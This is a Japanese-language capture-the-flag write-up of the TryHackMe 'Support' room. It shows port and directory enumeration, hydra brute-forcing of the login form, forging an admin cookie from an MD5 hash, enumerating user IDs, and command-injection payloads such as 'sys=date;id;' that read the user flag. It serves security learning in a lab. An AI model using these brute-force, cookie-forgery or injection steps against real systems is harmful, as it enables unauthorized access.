# Support CTF

https://tryhackme.com/room/support

## Enumeration

```shell
TARGET=10.146.185.244
sudo bash -c "echo $TARGET   support.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
root@ip-10-146-97-122:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.185.244
+ Target Hostname:    support.thm
+ Target Port:        80
+ Start Time:         2026-07-06 04:48:28 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ 1707 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-07-06 04:48:30 (GMT0) (2 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.146.185.244/ ----
==> DIRECTORY: http://10.146.185.244/includes/                                                                                                                                                                          
+ http://10.146.185.244/index.php (CODE:200|SIZE:2591)                                                                                                                                                                  
+ http://10.146.185.244/info.php (CODE:200|SIZE:73402)                                                                                                                                                                  
==> DIRECTORY: http://10.146.185.244/js/                                                                                                                                                                                
==> DIRECTORY: http://10.146.185.244/layout/                                                                                                                                                                            
+ http://10.146.185.244/server-status (CODE:403|SIZE:279)                                                                                                                                                               
==> DIRECTORY: http://10.146.185.244/skins/                                                                                                                                                                             
                                                                                                                                                                                                                        
---- Entering directory: http://10.146.185.244/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                        
---- Entering directory: http://10.146.185.244/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                        
---- Entering directory: http://10.146.185.244/layout/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                        
---- Entering directory: http://10.146.185.244/skins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php,php.bak -u http://$TARGET -w ./dirlist.txt -t 64 -k

/api.php              (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/footer.php           (Status: 200) [Size: 1253]
/includes             (Status: 301) [Size: 319] [--> http://10.146.185.244/includes/]
/index.php            (Status: 200) [Size: 2591]
/info.php             (Status: 200) [Size: 73314]
/js                   (Status: 301) [Size: 313] [--> http://10.146.185.244/js/]
/layout               (Status: 301) [Size: 317] [--> http://10.146.185.244/layout/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/skins                (Status: 301) [Size: 316]
```

ログイン画面でsqlmapと手動のSQLインジェクション調査を実行したが脆弱性は見つからなかった。

footer.php の実装。LFIがないか調査したが手応えなし。

```html
<ul class="dropdown-menu dropdown-menu-end">
    <li><a class="dropdown-item" href="?skin=default">Default</a></li>
    <li><a class="dropdown-item text-danger" href="?skin=red">Red</a></li>
    <li><a class="dropdown-item text-success" href="?skin=green">Green</a></li>
    <li><a class="dropdown-item text-primary" href="?skin=blue">Blue</a></li>
</ul>
```

config.php のパラメータを探したが手応えなし。

```sh
ffuf -u 'http://support.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

fasttrack によるブルートフォース失敗。  
rockyouで試したら、help@support.thm のパスワードが判明した。

```sh
hydra $TARGET http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -l admin@support.thm -P /usr/share/wordlists/fasttrack.txt -t 30

hydra $TARGET http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -l help@support.thm -P /usr/share/wordlists/fasttrack.txt -t 30

hydra $TARGET http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -l admin@support.thm -P /usr/share/wordlists/rockyou.txt -t 30

hydra $TARGET http-post-form "/index.php:email=^USER^&password=^PASS^:Invalid credentials" -l help@support.thm -P /usr/share/wordlists/rockyou.txt -t 30

[80][http-post-form] host: 10.146.185.244   login: help@support.thm   password: [REDACTED]
```

## Dashboard

isITUser というCookieがセットされていた。

```http
Cookie: PHPSESSID=47o61hr6ouj67221kqqvabab40; isITUser=68934a3e9455fa72420237eb05902327
```

これは `false` という文字列のMD5ハッシュだった。

`true` のMD5ハッシュに変更したら`IT Admin Panel` が表示された。

## IT Admin Panel

/user/1 にアクセスしたら管理者ユーザーのメールアドレス判明。2FAは無効。

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

/user/2 はITユーザー。

```json
{
    "email": "IT@support.thm",
    "2FA": false,
    "admin": false
}
```

specialadmin@support.thm は rockyou では割れなかった。

/user 以外のエンドポイントは発見できなかった。

```sh
ffuf -u 'http://support.thm/FUZZ/1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fc 404 -H 'Cookie: PHPSESSID=47o61hr6ouj67221kqqvabab40; isITUser=[REDACTED]'
```

/user/3 に対して下記リクエストでPOST,PUT,PATCHを試みたが、データは変更されなかった。

```json
{
    "email": "help@support.thm",
    "2FA": false,
    "admin": true
}
```

ページのソースを見たら、下記のコードがあった。（たぶん、skin=../config としたのがトリガーか？）

```php
<?php

$MASTER_PASSWORD = '[REDACTED]';

$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';


<nav class="navbar navbar-dark bg-dark">
```

このパスワードを使って specialadmin などでログインを試みたが失敗。

ここでスタックしてウォークスルーを見た。パスワードから@を削除したものを使うとログインできる。

## Admin

新たに表示されるようになったドロップダウンを操作すると、POSTデータが送信されている。

```sh
sys=date

sys=date+%2B%22%25H%3A%25M%3A%25S%22
```

コマンドインジェクションを試す。

```sh
sys=date;id;
```

idコマンドの実行に成功。

```html
<pre class="mb-0">Mon Jul  6 07:19:29 UTC 2026
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

下記でフラグ表示成功した。

```sh
sys=date;cat /home/ubuntu/user.txt;
```

## 振り返り

- パスワードから@を削除する部分は理解できなかった。
